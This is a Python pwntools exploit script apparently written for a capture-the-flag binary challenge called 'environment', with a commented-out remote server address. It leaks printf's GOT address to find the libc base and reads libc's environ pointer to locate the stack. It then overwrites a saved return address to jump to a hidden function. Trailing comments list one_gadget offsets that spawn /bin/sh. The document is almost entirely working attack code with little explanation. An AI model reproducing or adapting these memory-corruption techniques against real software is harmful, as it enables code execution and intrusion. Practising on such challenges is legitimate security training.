from pwn import *

exe = './environment'
# context.binary = exe
context.arch = 'amd64'

TIMEOUT = 0.5

p = process(exe)
libc = ELF('./libc.self')
ATEXIT_OFFSET = 0x001c0608

# p = remote('165.227.232.115',31881)
# libc = ELF('./libc.so.6', checksec=False)
# ATEXIT_OFFSET = 0x003e7738

elf = ELF(exe, checksec=False)

def put_back_prompt(data):
    lines = data.split(b'\n')
    last = lines[-1]
    if last.endswith(b'> '):
        p.unrecv(last)

def fix_prompt():
    data = p.recv(timeout=TIMEOUT)
    put_back_prompt(data)

recycle_count = 0

def recycle():
    global recycle_count
    if recycle_count < 10: choice='n'
    else: choice='y'
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', choice)
    if choice == 'n': 
        recycle_count += 1
    data = p.recvuntil('> ')
    put_back_prompt(data)
    return data

def get_printf_leak():
    leak = recycle()
    l = leak.split(b'Please accept this gift:')[1]
    l = l.split(b']')[0]
    l = l.split(b'0x')[1]
    address = int(l,16)
    log.info(f"GOT_PRINTF = {hex(address)}")
    put_back_prompt(leak)
    return address

def arbitrary_read(address):
    prompt = recycle()
    assert(b'Feel free to ask' in prompt)
    p.sendlineafter('> ', f"{hex(address)}")
    data = p.recvuntil('> ')
    put_back_prompt(data)
    leak = data.split(b'\x1b[0m')[1].split(b'\n\x1b[1;')[0]
    return leak

def write_mem(address, value):
    'write_mem has the side effect of setting recycle count to 20, meaning the program will exit immediately after'
    p.sendlineafter('> ', '1')
    # p.recvuntil('> ')
    p.sendlineafter('> ', f"{hex(address)}")
    p.sendlineafter('> ', f"{hex(value)}")
    # fix_prompt()

# prompt = p.recv()
# print(prompt)
# put_back_prompt(prompt)

# after 5th planting, get printf address
for i in range(4):
    recycle()

GOT_PRINTF = get_printf_leak()
libc.address = GOT_PRINTF - libc.sym['printf']
log.info(f"Libc base @ {hex(libc.address)}")

# at exactly 10th planting, we get arbitrary read
for i in range(4):
    recycle()
p.clean(timeout=TIMEOUT)
p.unrecv(b'> ')

# ADDR = libc.sym['_IO_2_1_stdin_']
# print(arbitrary_read(ADDR))

LEAK_ENVIRON = arbitrary_read(libc.sym['environ'])
# print(vtable_leak)
environ_stack_addr = int.from_bytes(LEAK_ENVIRON, 'little')
print(hex(environ_stack_addr))
fix_prompt()

# gdb.attach(p, gdbscript='''
# b * 0x0040149a
# c
# ''')

write_mem(environ_stack_addr - 304, elf.sym['hidden_resources'])

try:
    print(p.recv(timeout=2))
    print(p.recv(timeout=2))
    # p.interactive()
except:
    log.warn("DIED")

# write_mem(libc.address + ATEXIT_OFFSET, gadget)

# write_mem(IO_JUMPS + (offset * 8), elf.sym['hidden_resources'])
# write_mem(libc.address + ATEXIT_OFFSET, elf.sym['main'])


# print(p.recvall())

#b'\x1b[0m' before
#b'\n\x1b[1;' after

# print(hex(ADDR))
# gdb.attach(p, gdbscript=f"""
# x/x {hex(ADDR)}
# """)
# input()
#_IO_2_1_stdin_


#0x00602d68 = 0x004010b5

#0x7fffffffdf08 = 0x004010b5



# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL

# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
